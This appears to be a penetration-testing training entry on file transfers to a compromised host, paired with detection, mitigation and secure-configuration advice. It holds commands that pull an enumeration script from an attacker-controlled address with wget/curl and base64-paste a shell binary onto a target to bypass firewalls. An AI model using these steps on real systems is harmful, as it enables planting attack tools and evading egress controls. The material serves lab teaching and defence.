examples.label: Base64 transfer when no netcat/http
examples.command:
base64 shell -w 0   # attacker
echo <base64_blob> | base64 -d > shell   # target

examples.label: Validate type + integrity
examples.command:
file shell
md5sum shell   # compare both ends

notes: On the target, `wget`/`curl` from your Python http.server pulls tools in; base64 copy/paste works when there's no network path. Always verify with md5sum - terminals silently drop bytes on big blobs.

recommended.note: Run the enum script you transferred.

name: File Transfers - Basics
description: Host files from your box over HTTP and pull them onto the target with wget/curl, push with scp, or paste base64 when no network transfer is possible. Always verify with file/md5sum.

steps.label: 2. Download on the target
steps.command:
wget http://10.10.14.1:8000/linenum.sh
# or: curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

defense.why_it_works: Adversaries transfer tools or other files from an external system into a compromised environment through the command and control channel or alternate protocols. On Linux and macOS, native utilities like curl, wget, scp, sftp, tftp, and rsync are used — these are legitimate system tools, making the transfer difficult to distinguish from normal administrative file operations.
defense.prerequisites: Command execution on the target and network egress (or an alternate protocol) to the attacker host.
defense.impact: Attacker tooling delivered onto the target (or data exfiltrated back), enabling the next stage of the operation.
defense.detection: File transfers into a target generate detectable signals: inbound/outbound connections to the attacker host (HTTP, SCP, FTP) in network logs; download-utility execution (curl, wget, certutil, PowerShell download cradles) in process/command-line logs; and new files written to disk. EDR commonly flags living-off-the-land download tools invoked with network arguments.
defense.artifacts: New files on disk; outbound HTTP/SCP connections in network logs; download-utility execution (curl/wget/certutil) in process logs.
defense.prevention: [MITRE T1105 M1037 Filter Network Traffic] Restrict egress so hosts cannot reach arbitrary external addresses. [M1031 Network Intrusion Prevention] Inspect and block tool-transfer traffic at an IDS/IPS. Apply application control to block/monitor curl, wget, certutil, and PowerShell download cradles, and alert on new executables in world-writable/temp paths.
defense.evasion: When a firewall blocks downloading a file to the target, base64-encode the file, paste the string over the existing shell, and decode it on the target (base64 -d) — avoiding a separate network file transfer entirely (HTB M02). Using native/trusted binaries (LOLBins) and encrypted channels reduces detection further.
defense.misconfiguration: Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.
defense.vulnerable_config:
# Service listening on all interfaces with default creds (common in labs/staging):
ss -tlnp | grep LISTEN
# 0.0.0.0:21  (FTP on all interfaces)
# 0.0.0.0:3306 (MySQL on all interfaces — should be 127.0.0.1 only)
# 0.0.0.0:8080 (Tomcat with manager app accessible)

# Running services as root:
ps aux | grep -E '(mysql|apache|nginx|ftp)'
# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user
defense.secure_config:
# Bind services to localhost or specific IPs (not 0.0.0.0):
# MySQL: my.cnf -> bind-address = 127.0.0.1
# Apache: Listen 127.0.0.1:80 (if behind a proxy)

# Run services as dedicated low-priv users:
# systemd unit: User=mysql Group=mysql

# Host-based firewall (ufw):
ufw default deny incoming
ufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only
ufw allow 443  # HTTPS
ufw enable

# Change all default credentials immediately after installation
# Enable fail2ban for SSH and web services
